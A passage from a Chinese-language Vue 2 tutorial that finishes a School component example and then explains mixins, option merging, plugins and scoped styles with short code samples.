    <h2>学校名称：{{ name }}</h2>
    <h2>学校年龄：{{ age }}</h2>
    <h2>学校地址：{{ address }}</h2>
    <button @click="showName">点我提示学校名</button>
  </div>
</template>

<script>
export default {
  name: "School",
  // 最简单的写法：props: ['name', 'age']
  props: {
    name: {
      type: String,
      required: true // 必须要传的
    },
    age: {
      type: Number,
      required: true
    }
  },
  data() {
    return {
      address: "北京昌平",
    };
  },
  methods: {
    showName() {
      alert(this.name);
    },
  },
};
</script>

<style>
.demo {
  background-color: orange;
}
</style>
```

### 2.2.3 mixin(混入)

混入 (mixin) 提供了一种非常灵活的方式，来分发 Vue 组件中的可复用功能。一个混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被“混合”进入该组件本身的选项。

例子：

```js
// 定义一个混入对象
var myMixin = {
  created: function () {
    this.hello()
  },
  methods: {
    hello: function () {
      console.log('hello from mixin!')
    }
  }
}

// 定义一个使用混入对象的组件
var Component = Vue.extend({
  mixins: [myMixin]
})
```

**选项合并**

当组件和混入对象含有同名选项时，这些选项将以恰当的方式进行“合并”。

比如，数据对象在内部会进行递归合并，并在发生冲突时以组件数据优先。

```js
var mixin = {
  data: function () {
    return {
      message: 'hello',
      foo: 'abc'
    }
  }
}

new Vue({
  mixins: [mixin],
  data: function () {
    return {
      message: 'goodbye',
      bar: 'def'
    }
  },
  created: function () {
    console.log(this.$data)
    // => { message: "goodbye", foo: "abc", bar: "def" }
  }
})
```

同名钩子函数将合并为一个数组，因此都将被调用。另外，混入对象的钩子将在组件自身钩子**之前**调用。

```js
var mixin = {
  created: function () {
    console.log('混入对象的钩子被调用')
  }
}

new Vue({
  mixins: [mixin],
  created: function () {
    console.log('组件钩子被调用')
  }
})

// => "混入对象的钩子被调用"
// => "组件钩子被调用"
```

值为对象的选项，例如 `methods`、`components` 和 `directives`，将被合并为同一个对象。两个对象键名冲突时，取组件对象的键值对。

```js
var mixin = {
  methods: {
    foo: function () {
      console.log('foo')
    },
    conflicting: function () {
      console.log('from mixin')
    }
  }
}

var vm = new Vue({
  mixins: [mixin],
  methods: {
    bar: function () {
      console.log('bar')
    },
    conflicting: function () {
      console.log('from self')
    }
  }
})

vm.foo() // => "foo"
vm.bar() // => "bar"
vm.conflicting() // => "from self"
```

> 全局混入不建议使用

### 2.2.4 插件

插件通常用来为 Vue 添加全局功能。插件的功能范围没有严格的限制。

通过全局方法 `Vue.use()` 使用插件。它需要在你调用 `new Vue()` 启动应用之前完成：

```js
// 调用 `MyPlugin.install(Vue)`
Vue.use(MyPlugin)

new Vue({
  // ...组件选项
})
```

本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。

定义插件：

```js
对象.install = function (Vue, options) {
    // 1. 添加全局过滤器
    Vue.filter(....)

    // 2. 添加全局指令
    Vue.directive(....)

    // 3. 配置全局混入(合)
    Vue.mixin(....)

    // 4. 添加实例方法
    Vue.prototype.$myMethod = function () {...}
    Vue.prototype.$myProperty = xxxx
}
```

具体案例：

plugin.js

```js
export default {
    install(Vue, x, y, z) {
        console.log(x, y, z)
        //全局过滤器
        Vue.filter('mySlice', function (value) {
            return value.slice(0, 4)
        })

        //定义全局指令
        Vue.directive('fbind', {
            //指令与元素成功绑定时（一上来）
            bind(element, binding) {
                element.value = binding.value
            },
            //指令所在元素被插入页面时
            inserted(element, binding) {
                element.focus()
            },
            //指令所在的模板被重新解析时
            update(element, binding) {
                element.value = binding.value
            }
        })

        //定义混入
        Vue.mixin({
            data() {
                return {
                    x: 100,
                    y: 200
                }
            },
        })

        //给Vue原型上添加一个方法（vm和vc就都能用了）
        Vue.prototype.hello = () => { alert('你好啊aaaa') }
    }
}
```

main.js

```js
// 引入插件
import plugin from './plugin'

// 使用插件
Vue.use(plugin)
```

然后就可以在别的组件使用插件里的功能了。

### 2.2.5 scoped样式

1. 作用：让样式在局部生效，防止冲突。
2. 写法：```<style scoped>```

具体案例：

```vue
<style lang="less" scoped>
 .demo{
  background-color: pink;
  .atguigu{
   font-size: 40px;
  }
 }
</style>
```
